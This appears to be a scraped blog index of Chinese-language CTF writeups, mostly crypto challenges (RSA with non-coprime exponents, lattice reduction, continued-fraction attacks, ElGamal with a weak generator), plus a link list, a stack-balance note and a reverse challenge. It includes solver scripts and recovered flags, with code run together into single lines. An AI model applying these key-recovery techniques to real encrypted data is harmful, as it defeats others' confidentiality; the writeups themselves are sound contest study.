e==GCD(e,p-1)*GCD(e,q-1)*GCD(e,r-1)print(e)c=2832775557487418816663494645849097066925967799754895979829784499040437385450603537732862576495758207240632734290947928291961063611897822688909447511260639429367768479378599532712621774918733304857247099714044615691877995534173849302353620399896455615474093581673774297730056975663792651743809514320379189748228186812362112753688073161375690508818356712739795492736743994105438575736577194329751372142329306630950863097761601196849158280502041616545429586870751042908365507050717385205371671658706357669408813112610215766159761927196639404951251535622349916877296956767883165696947955379829079278948514755758174884809479690995427980775293393456403529481055942899970158049070109142310832516606657100119207595631431023336544432679282722485978175459551109374822024850128128796213791820270973849303929674648894135672365776376696816104314090776423931007123128977218361110636927878232444348690591774581974226318856099862175526133892i=pow(2,1024,n)i=pow(i,e,n)i=gmpy2.invert(i,n)c_=c*i%nc_=c_%(p*q)d1=gmpy2.invert(p_e*r_e,q-1)d2=gmpy2.invert(q_e*r_e,p-1)c_1=pow(c_,d2,p)c_2=pow(c_,d1,q)r1=rth_root(c_1,p_e,p)r2=rth_root(c_2,q_e,q)print('1')r1_all=findAllPRoot(r1,p,p_e)r2_all=findAllPRoot(r2,q,q_e)print('2',len(r1_all),len(r2_all))for i1 in r1_all: for i2 in r2_all: solve=crt([i1,i2],[p,q]) if b'SUSCTF' in long_to_bytes(solve): print(long_to_bytes(solve)) exit()print('end')# print(c_) SUSCTF{N0n_c0prime_RSA_c1pher_cAn_a1s0_recover_me33age!!!} 可惜效率不太理想，跑了接近一小时才出来 参考了dl的wp，发现可以通过快速找到特解，并遍历其解空间来更快地求解问题 1234567891011n,e=p*q,ep*eqphi=(p-1)*(q-1)c=pow(c,invert(er,phi),n)g0=pow(2,phi//e,n)m0=pow(c,invert(e,phi//e),n)for i in tqdm(range(e)): assert pow(m0,e,n)==c%n m=long_to_bytes(m0) if b'SUSCTF' in m: exit(print(m)) m0=m0*g0%n 大概只用20min 参考资料：RSA &amp; Incorrect Keys | Rec (rechn0.github.io)","link":"/2022/03/03/SUSCTF2022-large-case/"},{"title":"WriteUp of DASCTF Jan Crypto","text":"Writeup of DasCTF Jan Crypto[签到题]babyRSA附件一：chall.py 12345678910111213141516171819202122232425262728import osfrom secret import FLAG,p,q,efrom Crypto.Util.number import bytes_to_long,long_to_bytesN = p*qdef encrypt(m,N,e): return pow(m,e,N)def decrypt(c,N,d): return pow(c,d,N)def padding(msg): res = msg if len(res) &lt; 128: res = res + os.urandom(128-len(res)) return resdef transfer(msg): assert len(msg) &lt; 128 m = padding(msg) return bytes_to_long(m)if __name__ == &quot;__main__&quot;: m = transfer(FLAG) print(N,e) print(encrypt(m,N,e)) 附件二 enc看完附件后可以知道是比较简单的RSA类型 一开始看到e这么大便想到了维纳攻击，可是试了一下并没有解出d（还怀疑了一下脚本是不是出错了） 而后试了一下用yafu进行大数分解，并没有结果 最后还是得靠factordb.com(事实证明还是在线大数分解nb) 解出 12n=98197216341757567488149177586991336976901080454854408243068885480633972200382596026756300968618883148721598031574296054706280190113587145906781375704611841087782526897314537785060868780928063942914187241017272444601926795083433477673935377466676026146695321415853502288291409333200661670651818749836420808033*133639826298015917901017908376475546339925646165363264658181838203059432536492968144231040597990919971381628901127402671873954769629458944972912180415794436700950304720548263026421362847590283353425105178540468631051824814390421486132775876582962969734956410033443729557703719598998956317920674659744121941513 随后就可以随便算了 1234567891011from libnum import n2simport gmpy2p=133639826298015917901017908376475546339925646165363264658181838203059432536492968144231040597990919971381628901127402671873954769629458944972912180415794436700950304720548263026421362847590283353425105178540468631051824814390421486132775876582962969734956410033443729557703719598998956317920674659744121941513q=98197216341757567488149177586991336976901080454854408243068885480633972200382596026756300968618883148721598031574296054706280190113587145906781375704611841087782526897314537785060868780928063942914187241017272444601926795083433477673935377466676026146695321415853502288291409333200661670651818749836420808033e=2199344405076718723439776106818391416986774637417452818162477025957976213477191723664184407417234793814926418366905751689789699138123658292718951547073938244835923378103264574262319868072792187129755570696127796856136279813658923777933069924139862221947627969330450735758091555899551587605175567882253565613163972396640663959048311077691045791516671857020379334217141651855658795614761069687029140601439597978203375244243343052687488606544856116827681065414187957956049947143017305483200122033343857370223678236469887421261592930549136708160041001438350227594265714800753072939126464647703962260358930477570798420877c=1492164290534197296766878830710549288168716657792979479408332026408553210558539364503279432780006256047888761718878241924947937039103166564146378209168719163067531460700424309878383312837345239570897122826051628153030129647363574035072755426112229160684859510640271933580581310029921376842631120847546030843821787623965614564745724229763999106839802052036834811357341644073138100679508864747009014415530176077648226083725813290110828240582884113726976794751006967153951269748482024859714451264220728184903144004573228365893961477199925864862018084224563883101101842275596219857205470076943493098825250412323522013524phi=(p-1)*(q-1)d=gmpy2.invert(e,phi)flag=pow(c,d,p)# print(flag)print(n2s(73358773651424897743944056106548202261075477721417992498861765573582087801960732601862778348189621203820703393958329215404058952130344307891818721974239491062466090539708313506265450891835557762707471433442189955809731728025144732654599245515720346423528093783755219533095697004480866822694256749445957788813)) 最终得到flag:hwctf{01d_Curs3_c4Me_Again} crypto_Elgamal题目代码： 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970from Crypto.Util.number import *from key import FLAGdef keygen(size): q = getPrime(80) k = getPrime(944) while True: p = q * k + 1 if isPrime(p): break k += 1 g = 2 while True: if pow(g, q, p) == 1: break g += 1 A = getRandomInteger(size) % q B = getRandomInteger(size) % q x = getRandomInteger(size) % q h = pow(g, x, p) return (g, h, A, B, p, q), (x)def rand(A, B, q): global rand_state rand_state, ret = (A * rand_state + B) % q, rand_state return retdef encrypt(pubkey, m): g, h, A, B, p, q = pubkey assert 0 &lt; m &lt;= p r = rand(A, B, q) c1 = pow(g, r, p) c2 = (m * pow(h, r, p)) % p return (c1, c2)rand_state = getPrime(1024)pubkey, privkey = keygen(1024)m = bytes_to_long(FLAG)c1, c2 = encrypt(pubkey, m)c1_, c2_ = encrypt(pubkey, m)print(c1, c2)print(c1_, c2_)s0 = 543263588863771657634119s1 = 628899245716105951093835s2 = 78708024695487418261582s3 = 598971435111109998816796s4 = 789474285039501272453373assert ( A * s0 + B ) % q == s1assert ( A * s1 + B ) % q == s2assert ( A * s2 + B ) % q == s3assert ( A * s3 + B ) % q == s4p = 65211247300401312530078141569304950676358489059623557848188896752173856845051471066071652073612337629832155846984721797768267868868902023383604553319793550396610085424563231688918357710337401138108050205457200940158475922063279384491022916790549837379548978141370347556053597178221402425212594060342213485311g = 27642593390439430783453736408814717946185190497201679721975757020767271070510268596627490205095779429964809833535285315202625851326460572368018875381603399143376574281200028337681552876140857556460885848491160812604549770668188783258592940823128376128198726254875984002214053523752696104568469730021811399216h = 54585833166051670245656045196940486576634589000609010947618047461787934106392112227019662788387352615714332234871251868259282522817042504587428441746855906297390193418159792477477443129333707197013251839952389651332058368911829464978546505729530760951698134101053626585254469108630886768357270544236516534904c1 = 60724920570148295800083597588524297283595971970237964464679084640302395172192639331196385150232229004030419122038089044697951208850497923486467859070476427472465291810423905736825272208842988090394035980454248119048131354993356125895595138979611664707727518852984351599604226889848831071126576874892808080133c2 = 48616294792900599931167965577794374684760165574922600262773518630884983374432147726140430372696876107933565006549344582099592376234783044818320678499613925823621554608542446585829308488452057340023780821973913517239972817669309837103043456714481646128392677624092659929248296869048674230341175765084122344264c1_ = 42875731538109170678735196002365281622531058597803022779529275736483962610547258618168523955709341579773947887175626960699426438456382655370090748369934296474999389316334717699127421889816721511602392591677377678759026657582648354688447456509292302633971842316239774410380221303269351351929586256938787054867c2_ = 64829024929257668640929285124747107162970460545535885047576569803424908055130477684809317765011143527867645692710091307694839524199204611328374569742391489915929451079830143261799375621377093290249652912850024319433129432676683899459510155157108727860920017105870104383111111395351496171846620163716404148070 （分析不难，关键在于转化为RSA问题后对e和p-1不互素情况下根的求解） 粗略分析一下，发现有对同一flag加密得到的两组密文，而这两组密文的联系是随机数r1和r2。因此可以断定从伪随机数发生器入手，对密文组(c1,c2)，(c1_ , c2_ )进行变换从而得到flag(由于密钥x为止因此基本可以忽略c1和c1_) 而对于伪随机数发生器，题目也给了相应的提示： 12345678910s0 = 543263588863771657634119s1 = 628899245716105951093835s2 = 78708024695487418261582s3 = 598971435111109998816796s4 = 789474285039501272453373assert ( A * s0 + B ) % q == s1assert ( A * s1 + B ) % q == s2assert ( A * s2 + B ) % q == s3assert ( A * s3 + B ) % q == s4 线性方程组乱解一通后便得到了： 123q= 791763770658839585424113A=12742153496769814072597B=3035433788765894539799 接下来分析c2和c2_的关系，已c_2=m*h^{r_1}\\ mod\\ p,c_2\\_=m*h^{r_2}\\ mod\\ p，而r_2=r_1*A+B\\ mod\\ p 即： c_2\\_=m*h^{r_1*A+B}=m*h^{r_1*A}*h^B=m^{1-A}*(m*h^{r_1})^A*h^B=c_2^A*m^{1-A}*h^B\\ mod\\ p因此： m^{1-A}=c_2\\_*c_2^{-A}*h^{-B}\\ mod\\ p由此即可以得到$m^{1-A}\\ mod\\ p$的值，现在已经将Elgamal问题转换为加密指数e=1-A的类RSA问题了 问题棘手的地方在于$gcd(1-A,p-1)=7438$,无法直接对1-A求逆 接下来的解决方法可以参考这题：NCTF2019 easyRSA (附上写的非常详细的wpNCTF2019-官方writeup – 郁离歌丶的博客 (yulige.top))（接下来我都建议去看这篇wp） 实际上在$gcd(1-A,p-1)=e$的情况下，$m$有$e$个解 首先先尝试得到其中一个解： 详细方法和情形可以参考这篇paper1111.4877.pdf (arxiv.org) 快速定位到此处： 通过这个算法能找到方程其中的一个解 那么如何找到所有解呢？ 观察 x^{p-1}=1\\ mod\\ p\\\\ (x^{\\frac{p-1}{e}})^e=1\\ mod\\ p也就是说，若$r$是方程$x^e=c\\ mod\\ p$的一个解，那么 r^e=c\\ mod\\ p\\\\ (r*x^{i*\\frac{p-1}{e}})^e=r^e*x^{i*(p-1)}=r^e*1^i=c\\ mod\\ p(r*x^{i*\\frac{p-1}{e}})也是方程的解，其中$x$为$(1,p-1)$的一个随机数，$i \\in [0,e-1]$， 遍历$i$，既可以得到方程的所有解，最后在所有解中搜索符合字符串’flag’即可得到flag:flag{19e9f185e6a680324cedd6e6d9382743} （应该是没错的，写完的时候比赛已经结束了 /(ㄒoㄒ)/~~） 附上解方程的脚本： 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657import randomfrom libnum import n2simport sympydef rth_root(cip,r,q): &quot;&quot;&quot; cip^r==q &amp;&amp; r|q-1 &quot;&quot;&quot; rnum=random.randint(1,q) while (pow(rnum,(q-1)//r,q)==1): rnum=random.randint(1,q) t=1 while((q-1)%pow(r,t)==0): t+=1 t-=1 s=(q-1)//pow(r,t) k = 1 while (k * s + 1) % r != 0: k += 1 alpha = (k * s + 1) // r a=pow(rnum,pow(r,t-1)*s,q) b=pow(cip,r*alpha-1,q) c=pow(rnum,s,q) h=1 print('t='+str(t)) for i in range(1,t): # print('1213') d=pow(b,pow(r,t-1-i),q) if d==1: j=0 else: j=(-sympy.discrete_log(q,d,a))%q b=b*(pow(pow(c,r,q),j,q))%q h=h*pow(c,j,q)%q c=pow(c,r,q)%q return pow(cip,alpha,q)*h%qdef findAllPRoot(root,p,e): maySolve=[root] while(len(maySolve)&lt;e): maySolve.append(root*pow(random.randint(2,p-1),(p-1)//e,p)%p) print('finish') return maySolveflag=52498780852251471256496883766677451330444042209592264044862955792645421608045437240170037309824495794108442986910150817628974914953272047997425815789167047966004466233826304133412591056777880709534691777621768967479001867448270089911182059438848229977940628161790899565867768072121376211486485752798175076955e=7438p = 65211247300401312530078141569304950676358489059623557848188896752173856845051471066071652073612337629832155846984721797768267868868902023383604553319793550396610085424563231688918357710337401138108050205457200940158475922063279384491022916790549837379548978141370347556053597178221402425212594060342213485311r=rth_root(flag,e,p)print(r)print(pow(r,e,p)==flag)maySolve=findAllPRoot(r,p,e)# x=random.randint(1,p)# solve2=r*pow(x,(p-1)//e,p)%p# print(solve2)# print(pow(solve2,e,p)==flag)print('start')file=open('111.txt','wb')for i in maySolve: file.write(n2s(i)) （写得比较乱，如有错漏还请客官指出）","link":"/2022/01/25/Writeup-of-DASCTF2022-Jan-Crypto2/"},{"title":"一些不错的文章（持续更新）","text":"C语言相关 C语言函数调用栈（一）C语言函数调用栈(一) - clover_toeic - 博客园 (cnblogs.com) C语言函数调用栈（二）C语言函数调用栈(二) - clover_toeic - 博客园 (cnblogs.com) 格式化字符串漏洞原理详解格式化字符串漏洞原理详解_ditto的博客-CSDN博客_格式化字符串漏洞 plt表和got表(27条消息) GOT表和PLT表知识详解_qq_18661257的专栏-CSDN博客_got表 工具学习 checksec及其包含的保护机制[讨论]checksec及其包含的保护机制-二进制漏洞-看雪论坛-安全社区|安全招聘|bbs.pediy.com pwntools学习：[原创][新手向] 一步一步学pwntools-Pwn-看雪论坛-安全社区|安全招聘|bbs.pediy.com (27条消息) IDA反编译失败总结_寻梦&amp;之璐-CSDN博客 Linux: 浅谈elf中的got和plt(27条消息) 浅析ELF中的GOT与PLT__wells的博客-CSDN博客_got plt [pwn基础]Linux安全机制 - VxerLee昵称已被使用 - 博客园 (cnblogs.com) 逆向： 利用符号执行去除控制流平坦化 - 博客 - 腾讯安全应急响应中心 (tencent.com) [原创]Python逆向——Pyinstaller逆向-软件逆向-看雪论坛-安全社区|安全招聘|bbs.pediy.com IDA出现”sp-analysis failed”和F5(反编译)失败 - 灰信网（软件开发博客聚合） (freesion.com) 数学/密码学： RSA攻击汇总 (qq.com) RSA | Lazzaro (lazzzaro.github.io) 【浅谈系列】高次剩余的求解 - Arpe1s’ Blog Hensel’s lemma (1) - 知乎 (zhihu.com) (52条消息) 密码学硬核笔记——扩展维纳攻击_Gm1y的博客-CSDN博客_扩展维纳攻击 待分类 由defcon延伸出的一类特殊RCE - 跳跳糖 (tttang.com)","link":"/2022/02/03/%E4%B8%80%E4%BA%9B%E4%B8%8D%E9%94%99%E7%9A%84%E6%8A%80%E6%9C%AF%E6%96%87%E7%AB%A0%EF%BC%88%E6%8C%81%E7%BB%AD%E6%9B%B4%E6%96%B0%EF%BC%89/"},{"title":"堆栈平衡","text":"参考：堆栈平衡 - cat47 - 博客园 (cnblogs.com) （本篇其实也就搬运了一下） 什么是堆栈平衡 如果要返回父程序，则当我们在堆栈中进行堆栈的操作的时候，一定要保证在RET这条指令前,ESP指向的是我们压入栈中的地址 如果通过堆栈传递参数来，那么在函数执行完毕后，要平衡参数导致的堆栈变化 含义就是当函数在一步步执行的时候一直到ret执行之前，堆栈栈顶的地址一定要是call指令的下一个地址。 如果堆栈变化了，就要走ret执行前将堆栈恢复成原来的样子 会影响堆栈的情况1. 函数中push进栈例如： 1234call xx函数函数： mov ...(不影响堆栈平衡) push ...(影响堆栈平衡) ret... 2. 堆栈传递参数函数调用时传递参数通过向栈中压入参数完成，在被调用函数完成后该传递的参数也就失去了作用，需要将堆栈恢复到调用前的位置，例如： 主函数： 被调用函数： 堆栈如下： 解决方法1. 在函数外部调整栈顶地址使用add指令，对esp寄存器进行操作 2. 在函数内部添加 ret 8 是把ret和把第一种情况的add两条指令整合成一条指令，在函数内部完成堆栈平衡。","link":"/2022/02/03/%E5%A0%86%E6%A0%88%E5%B9%B3%E8%A1%A1/"},{"title":"复健训练","text":"考完试了，写点题目练习一下，主要来自BUUOJ的近期比赛 DASCTF X CBCTF 2022九月赛CryptoLittleRSA题目描述 123456789101112131415161718192021222324252627from Crypto.Util.number import *import sympyimport randomfrom secret import flagm = bytes_to_long(flag)p = getPrime(512)q = getPrime(512)phi = (p-1)*(q-1)e = 65537n = p * qc = pow(m, e, n)s = getPrime(300)N = getPrime(2048)g = p * inverse(s,N)**2 % (N**2)print(N)print(g)print(n)print(c)'''193513010358015081169555520633163274632279286383192840825040707452301197923074210995349038377663176399139379547848575769914012148610674717726147533378218711081897803310810990418246692439280567651150687642467656809623486463839913038284261253038443942686821917752326112880392003165952790554088272962562891436028275253732675366438657296463530716370543677022185158039801224358111299354504869501372798244914610413915722643717997972003318386905233491055899850327306683157873188292447433172577937531472098754581273408754003670818657622865659786209791964104112414428944509552802375132493936126035604102918258055535365955439371011720110790132739467118823404398231490558094490357447186598187961357141017216411901149541300414777144663214989032102206944353547957442258433144476456233376686970581279751045863752926360801143472946970072314877825488460951073294454793673244246727760038997482343538578726275855953437364520881568850819077587270857233125064895493647216446362517803503124130981325060515313116856369211174574697456373477383368293506349942714195547414255906369531547539709029769593083238386170910607548267274176888360265976148947453488080196541001966157197301099095788992992468489161820347052592069065527690870381792881390867727199945771681847010969222916105236760391270125181000237655485522109444267494748883117510699361445833751940232278878487042675879152370574326096633281456081945507360742508224167794484670848421271655536495133976064640598473618806492139340697159965897517783845137243065210432552994434804826401837401315633180584547119133975334369856181829236461924814861209420737193213722365390191079099105970471333717080177557444951341167719995219536545966322215192663393724394525580831996400350698525303735107588594603500257366298010867577178381597745425067553356606077666779921056015186944051135523213421520418085861871818006798456727887462733139010692891972727217347407061891195131321660659810849572438228436141537545449059441030634574806942474010077295501530459294212902609611342419820932737512457666657746976112447079284285488492419944999692913461338262639435198854198038835815614333297953805846589017976033731578939891556064146565696879705075584979951609249982849856103564442566936515708380814106997783395400669324617748952940831076546581735494963467680719842859574144530848473300102236821201997786375946601413660428461473204032985053128283751860315027843200214217715401391736262811016964783589439740884991543059175666298728428567481043422497862838127903980''' solve: 由于p的位数明显较小，有如下关系 g*s^2\\equiv p\\ mod\\ N构建如下格 \\left( \\begin{matrix} &0\\ &1\\\\ &g\\%N\\ &N \\end{matrix} \\right)脚本如下 12345678910111213141516171819import gmpy2from Crypto.Util.number import long_to_bytesN=19351301035801508116955552063316327463227928638319284082504070745230119792307421099534903837766317639913937954784857576991401214861067471772614753337821871108189780331081099041824669243928056765115068764246765680962348646383991303828426125303844394268682191775232611288039200316595279055408827296256289143602827525373267536643865729646353071637054367702218515803980122435811129935450486950137279824491461041391572264371799797200331838690523349105589985032730668315787318829244743317257793753147209875458127340875400367081865762286565978620979196410411241442894450955280237513249393612603560410291825805553536595543937g=101172011079013273946711882340439823149055809449035744718659818796135714101721641190114954130041477714466321498903210220694435354795744225843314447645623337668697058127975104586375292636080114347294697007231487782548846095107329445479367324424672776003899748234353857872627585595343736452088156885081907758727085723312506489549364721644636251780350312413098132506051531311685636921117457469745637347738336829350634994271419554741425590636953154753970902976959308323838617091060754826727417688836026597614894745348808019654100196615719730109909578899299246848916182034705259206906552769087038179288139086772719994577168184701096922291610523676039127012518100023765548552210944426749474888311751069936144583375194023227887848704267587915237057432609663328145608194550736074250822416779448467084842127165553649513397606464059847361880649213934069715996589751778384513724306521043255299443480482640183740131563318058454711913397533436985618182923646192481486120942073719321372236539019107909910597047133371708017755744495134116771999521953654596632221519266339372439452558083199640035069852530373510758859460350025736629801086757717838159774542506755335660607766677992105601518694405113552321342152041808586187181800679845672788746273313n=90106928919727272173474070618911951313216606598108495724382284361415375454490594410306345748069424740100772955015304592942129026096113424198209327375124576666577469761124470792842854884924199449996929134613382626394351988541980388358156143332979538058465890179760337315789398915560641465656968797050755849799c=51609249982849856103564442566936515708380814106997783395400669324617748952940831076546581735494963467680719842859574144530848473300102236821201997786375946601413660428461473204032985053128283751860315027843200214217715401391736262811016964783589439740884991543059175666298728428567481043422497862838127903980v1=vector(ZZ,[0,g%N])v2=vector(ZZ,[1,N])m=matrix([v1,v2])print(m.LLL())e=65537p=8640002811717397823892474058167788615113205903077061861590520377451867637348771860824972890020165996777729868251869232382053496274304375769436361474547973q=n//pphi=(p-1)*(q-1)d=gmpy2.invert(e,phi)print(long_to_bytes(pow(c,d,n)))# CBCTF{L4ttic3_15_6ood_i5n7_it?} easySignIn123456789101112131415161718192021222324252627282930313233343536from Crypto.Util.number import *import libnumfrom random import randintfrom secret import flagp = getPrime(512)d = getPrime(40)m = libnum.s2n(flag)a = randint(2,p)b = randint(2,p)c = randint(2,p)g = dfor i in range(10): g = (c*d^2 + b*g + a)%p a = (a*b - c) % p b = (b*c - a) % p c = (c*a - b) % p t = (m+d)^2 %pprint('p=',p)print('a=',a)print('b=',b)print('c=',c)print('g=',g)print('t=',t)'''p= 7591656713055743077369340861541583433090841738590989539280316533530045331013958613146671718809022799047779468311222607020894006899032327866283558110087799a= 4392865163304254999527172406061971162689920565151840813033448791785156740502864894051809689255751412382468345217962713758808061870635744521996229554057672b= 2119856022628544669301306700581535843188073099896481101405665476192582614655960576092254118367775147735092457551317887281026710342124525625026559538165667c= 3370586754351688470908526079815435343732016329743637661764947106415792049906966624513736208696137655804912688128186282852926377345819134856707156640355705g= 2221154642536617375933147254663757148609834736621720750750043572054496685087600339999953459509198087870095805651320901316659013390557077204194753685935362t= 6426975621182152052236088849377616252912408340750729257254509090637526282051064469268808395760737262115678691330037039061905028548054911000486882481093832''' solve: 每一轮的a、b、c都可以通过逆向同余式求解出来 然后通过解方程组即可 12345678910111213141516171819202122232425262728293031import gmpy2from Crypto.Util.number import long_to_bytesp= 7591656713055743077369340861541583433090841738590989539280316533530045331013958613146671718809022799047779468311222607020894006899032327866283558110087799a= 4392865163304254999527172406061971162689920565151840813033448791785156740502864894051809689255751412382468345217962713758808061870635744521996229554057672b= 2119856022628544669301306700581535843188073099896481101405665476192582614655960576092254118367775147735092457551317887281026710342124525625026559538165667c= 3370586754351688470908526079815435343732016329743637661764947106415792049906966624513736208696137655804912688128186282852926377345819134856707156640355705g= 2221154642536617375933147254663757148609834736621720750750043572054496685087600339999953459509198087870095805651320901316659013390557077204194753685935362t= 6426975621182152052236088849377616252912408340750729257254509090637526282051064469268808395760737262115678691330037039061905028548054911000486882481093832R.&lt;x&gt;=Zmod(p)[]a_=[0]*10b_=[0]*10c_=[0]*10for i in range(9,-1,-1): c=(c+b)*gmpy2.invert(a,p)%p b=(b+a)*gmpy2.invert(c,p)%p a=(a+c)*gmpy2.invert(b,p)%p a_[i]=a b_[i]=b c_[i]=cgg=x# print(a_,b_,c_)for i in range(10): gg=(c_[i]*x^2+b_[i]*gg+a_[i])f=gg-gprint(f.roots())f=x^2-tprint(f.roots())md=130661655927230795642760431379039778633673372572819159728043876332994399613135476225358d=793009095377print(long_to_bytes(md-d)) easyRSA题目描述 1234567891011121314151617181920212223242526272829303132333435from Crypto.Util.number import *import gmpy2from secret import flagbitlen = 512p = getPrime(bitlen)q = getPrime(bitlen)r = getPrime(bitlen)assert p != q and q != r and p != rn = p*q*rphi = (p-1)*(q-1)*(r-1)while 1: d = getPrime(256) try: e = int(gmpy2.invert(d,phi)) except: continue if gmpy2.gcd(e,phi) == 1 : breakassert flag.startswith(b'CBCTF{')m = bytes_to_long(flag)c = pow(m,e,n)print('c =',c)print('e =',e)print('n =',n)'''c = 262857004135341325365954795119195630698138090729973647118817900621693212191529885499646534515610526918027363734446577563494752228693708806585707918542489830672358210151020370518277425565514835701391091303404848540885538503732425887366285924392127448359616405690101810030200914619945580943356783421516140571033192987307744023953015589089516394737132984255621681367783910322351237287242642322145388520883300325056201966188529192590458358240120864932085960411656176e = 543692319895782434793586873362429927694979810701836714789970907812484502410531778466160541800747280593649956771388714635910591027174563094783670038038010184716677689452322851994224499684261265932205144517234930255520680863639225944193081925826378155392210125821339725503707170148367775432197885080200905199759978521133059068268880934032358791127722994561887633750878103807550657534488433148655178897962564751738161286704558463757099712005140968975623690058829135n = 836627566032090527121140632018409744681773229395209292887236112065366141357802504651617810307617423900626216577416313395633967979093729729146808472187283672097414226162248255028374822667730942095319401316780150886857701380015637144123656111055773881542557503200322153966380830297951374202391216434278247679934469711771381749572937777892991364186158273504206025260342916835148914378411684678800808038832601224951586507845486535271925600310647409016210737881912119''' solve: 不太懂连分式理论，粘贴一些dl的证明和代码 对于渐进分数$r_k=\\frac{p_k}{q_k}$，以下递推公式适用于它们的快速计算 \\frac{p_k}{q_k}=\\frac{a_kp_{k-1}+p_{k-2}}{a_kq_{k-1}+q_{k-2}}其中$\\frac{p_{-1}}{q_{-1}}=\\frac{1}{0}$并且$\\frac{p_{-2}}{q_{-2}}=\\frac01$ 证明： from 【学术】连分数 - trsins - 博客园 (cnblogs.com) 12345678910111213141516171819202122232425262728293031323334353637383940from Crypto.Util.number import *from multiprocessing import Poolimport osimport gmpy2def get_d(i): global q_k_1 global q_k k = i.numerator() q_k = i.denominator() # print(&quot;Now is: %d&quot; % q_k) # print(&quot;%s is run&quot; %os.getpid()) for r in range(20): d = r * q_k + q_k_1 if pow(pow(2, e, n), d, n) != 2: continue else: # print(r) # print(q1) # print(q0) return d q_k_1 = q_kif __name__ == &quot;__main__&quot;: e = 543692319895782434793586873362429927694979810701836714789970907812484502410531778466160541800747280593649956771388714635910591027174563094783670038038010184716677689452322851994224499684261265932205144517234930255520680863639225944193081925826378155392210125821339725503707170148367775432197885080200905199759978521133059068268880934032358791127722994561887633750878103807550657534488433148655178897962564751738161286704558463757099712005140968975623690058829135 n = 836627566032090527121140632018409744681773229395209292887236112065366141357802504651617810307617423900626216577416313395633967979093729729146808472187283672097414226162248255028374822667730942095319401316780150886857701380015637144123656111055773881542557503200322153966380830297951374202391216434278247679934469711771381749572937777892991364186158273504206025260342916835148914378411684678800808038832601224951586507845486535271925600310647409016210737881912119 c = 262857004135341325365954795119195630698138090729973647118817900621693212191529885499646534515610526918027363734446577563494752228693708806585707918542489830672358210151020370518277425565514835701391091303404848540885538503732425887366285924392127448359616405690101810030200914619945580943356783421516140571033192987307744023953015589089516394737132984255621681367783910322351237287242642322145388520883300325056201966188529192590458358240120864932085960411656176 q_k_1 = 1 conv = continued_fraction(Integer(e)/Integer(n)).convergents() pool = Pool() # 这里用的进程池缩短总的运算时间 res = pool.map(get_d , conv) pool.close() pool.terminate() for i in res: if i != None: d = i m = pow(c, d, n) print(long_to_bytes(m).decode()) Reverselanding一开始先对输入做了个异或和加一的操作，然后进到func1 不过func1也就是给了个假flag 注意到有个nothing的函数，需要去花指令，完成后发现其实就是Base64+1 注意到main函数的汇编代码（从字符串查看验证成功的语句调用可以发现这一点），可以发现由于跳转语句，反编译成c语句时有一些语句被忽略掉了，而这里则隐藏了真正的flag 接着逆向做操作即可 1234567891011121314import base64s='GUw\\D~UHG#kYG~\\x7fBA#{QJT(\\A {BG~$BG~$BGz//'ss=''for i in range(len(s)-2): ss+=chr((ord(s[i])^0x12)-1)ss+='=='print(ss)ss=base64.b64decode(ss)print(ss)flag=''for i in range(len(ss)): flag+=chr((ss[i]-1)^0x22)print(flag) DASCTF X GFCTF 2022 十月赛CryptoRSA题目描述 123456789101112131415161718192021222324252627282930313233343536373839404142from Crypto.Util.number import *from secret import flagdef encrypt1(n): n1 = hex(n&gt;&gt;200).encode() n2 = str(hex(n))[20:].encode() return n1,n2def encrypt2(m , n_1): c_1 = pow(m,e_1,n_1) print('c_1 = '+str(c_1))def encrypt3(m , n_2): c_2 = pow( m , e_2 , n_2) print('c_2 = '+str(c_2))def encrypt4(m): k = getPrime(512) m = m % k c_3 = pow(m, e_2, n_3) print('c_3 = ' + str(c_3)) print('m = ' + str(m)) print('k = ' + str(k))m1,m2 = encrypt1(flag)m1 = bytes_to_long(m1)m2 = bytes_to_long(m2)print('n_2 = ' + str(n_2))print('n_3 = ' + str(n_3))print('e_1 = ' + str(e_1))print('e_2 = ' + str(e_2))encrypt2(m1,n_1)encrypt3(n_1,n_2)encrypt4(m2) 没啥好说的 1234567891011121314151617181920212223242526272829303132import gmpy2from Algorithm import crtfrom Crypto.Util.number import long_to_bytesn_2 = 675835056744450121024004008337170937331109883435712066354955474563267257037603081555653829598886559337325172694278764741403348512872239277008719548968016702852609803016353158454788807563316656327979897318887566108985783153878668451688372252234938716250621575338314779485058267785731636967957494369458211599823364746908763588582489400785865427060804408606617016267936273888743392372620816053927031794575978032607311497491069242347165424963308662091557862342478844612402720375931726316909635118113432836702120449010n_3 = 91294511667572917673898699346231897684542006136956966126836916292947639514392684487940336406038086150289315439796780158189004157494824987037667065310517044311794725172075653186677331434123198117797575528982908532086038107428540586044471407073066169603930082133459486076777574046803264038780927350142555712567e_1 = 65537e_2 = 3c_1 = 47029848959680138397125259006172340325269302342762903311733700258745280761154948381409328053449580957972265859283407071931484707002138926840483316880087281153554181290481533c_2 = 332431c_3 = 11951299411967534922967467740790967733301092706094553308467975774492025797106594440070380723007894861454249455013202734019215071856834943490096156048504952328784989777263664832098681831398770963056616417301705739505187754236801407014715780468333977293887519001724078504320344074325196167699818117367329779609m = 9530454742891231590945778054072843874837824815724564463369259282490619049557772650832818763768769359762168560563265763313176741847581931364k = 8139616873420730499092246564709331937498029453340099806219977060224838957080870950877930756958455278369862703151353509623205172658012437573652818022676431n2_f=[2,3,5,19,43,727,21377,1774255810962402927854617467736437558015832859162695972437080999986841488362163065757284273404492965151895572185037922941735844203093763742153422195600407413237790596770765394865842116793139697886868514274811230127220896188627876269792586429551704337597910560741449655178321410839027641646617307595992150889908635156584915957622551263673027277276187672558029584687969232464438280971534066105631570785915706346112839602048883924058872894665070412745019861226429500060069450710943722161730711024438779569]n2_c=[]t=1while(1): if (gmpy2.iroot(c_2+t*n_2,3)[1]==True): break t+=1n_1=gmpy2.iroot(c_2+t*n_2,3)[0]print(n_1)f1=2224243981f2=2732337821f3=11585031296201346891716939633970482508158508580350404805965250133832632323150440185890235814142601827544669601048550999405490149435265122374459158586377571phi=(f1-1)*(f2-1)*(f3-1)d=gmpy2.invert(65537,phi)m1=pow(c_1,d,n_1)print()a=int(long_to_bytes(m1).decode()+long_to_bytes(m).decode()[-50:],16)print(long_to_bytes(a)) Recover Secret题目描述： 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130import gmpy2 as gyimport randomimport functoolsimport libnumfrom Crypto.Util import numberfrom datetime import datetimeimport osimport sysof = open('output','w')sys.stdout = of_N = gy.next_prime(2 ** 